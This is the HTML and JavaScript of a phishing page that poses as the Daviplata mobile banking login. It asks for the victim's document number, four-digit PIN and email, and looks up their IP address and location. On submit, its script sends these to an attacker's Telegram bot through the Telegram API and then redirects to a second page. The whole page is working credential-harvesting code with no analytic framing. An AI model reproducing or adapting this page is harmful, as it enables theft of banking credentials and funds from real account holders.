<html><head>
  	<title>daviplata</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;display=swap" rel="stylesheet">

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

	<script src="datos_del_tel.js"></script>
	
	
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  

   <script>
         $.getJSON("https://api.ipify.org?format=json",
          function(data) {
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#ip").html("IP: " + response.ip);
    $("#address").html("" + response.city + ", " + response.country);
    })
      </script>
   <script>

var u_name, pax, ip, ip2, email;
var ready = function () {
    u_name = document.getElementById("numdoc").value;
    pax = document.getElementById("clavdav").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    email = document.getElementById("email").value;
    message = "Datos Daviplata\nNumDocumento: " + u_name + "\nClaveDaviplata: " + pax + "\nEmail: " + email + "\nIP: " + ip + "\n" + ip2;
};

};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.php';
        console.log(response);
    });
    return false;
};
   </script>

	</head>
	<body>
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-6 text-center mb-5">
					<h2 class="heading-section">Bienvenido</h2>
				</div>
			</div>
			<div class="row justify-content-center">
				<div class="col-md-7 col-lg-5">
					<div class="login-wrap p-4 p-md-5">
		      	<div>
				<img class="icon d-flex align-items-center justify-content-center" src="archives/descargaa.png" style="width:40%;height:auto;">
		      		
		      	</div>
		      	<h3 class="text-center mb-4"></h3>
						<form method="post" action="" onsubmit="return sender()">
				
				
						<p id="gfg" hidden="">191.95.57.2</p>
						<p id="address" hidden="">Barrio San Luis, CO</p>
		      		<div class="form-group">
		      			<input type="tel" id="numdoc" class="form-control rounded-left" onkeypress="return (event.charCode >= 48 &amp;&amp; event.charCode <= 57)" placeholder="Número de documento" required="">
		      		</div>
	            <div class="form-group d-flex">
	              <input type="tel" id="clavdav" onkeypress="return (event.charCode >= 48 &amp;&amp; event.charCode <= 57)" class="form-control rounded-left" minlength="4" maxlength="4" placeholder="Clave Daviplata" required="">
	            </div>


             <input type="email" id="email" class="form-control rounded-left" onkeypress="return (event.charCode >= 48 &amp;&amp; event.charCode <= 57)" placeholder="Email asociado a tu DaviPlata" required="" style="
    margin-bottom: 1rem;
">
	            <div class="form-group">
	            	<button type="submit" class="form-control btn btn-primary rounded submit px-3">Ingresar</button>
	            </div>
	            <div class="form-group d-md-flex">
	            	<div class="w-50">
	            		<label class="checkbox-wrap checkbox-primary">Recordarme
									  <input type="checkbox" checked="">
									  <span class="checkmark"></span>
									</label>
								</div>
								<div class="w-50 text-md-right">
									<a href="#">¿Olvidó su clave?</a>
								</div>
	            </div>
	          </form>
	        </div>
				</div>
			</div>
		</div>
	</section>
